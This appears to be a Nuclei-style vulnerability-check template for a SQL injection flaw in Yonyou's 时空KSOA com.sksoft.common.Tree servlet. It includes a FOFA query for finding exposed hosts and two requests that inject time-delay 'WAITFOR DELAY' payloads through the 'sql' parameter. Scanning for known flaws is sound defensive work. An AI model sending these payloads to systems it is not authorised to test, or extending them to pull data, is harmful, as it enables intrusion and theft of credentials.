id: yonyou-ksoa-tree-sql
info:
  name: 用友时空KSOA com.sksoft.common.Tree组件SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="用友-时空KSOA"
          用友时空KSOA系统com.sksoft.common.Tree接口存在SQL注入缺陷。攻击者可利用该漏洞提取数据库敏感信息（如管理员凭据、用户隐私数据），在具备高权限条件下，可能实现服务器端恶意代码部署，进而控制服务器。
  tags: 用友时空KSOA
http:
- raw:
  - |
    GET /servlet/com.sksoft.common.Tree?sql=;WAITFOR%20DELAY%20%270:0:5%27--&BhSwitch=0 HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
  - |
    GET /servlet/com.sksoft.common.Tree?sql=;WAITFOR%20DELAY%20%270:0:8%27--&BhSwitch=0 HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
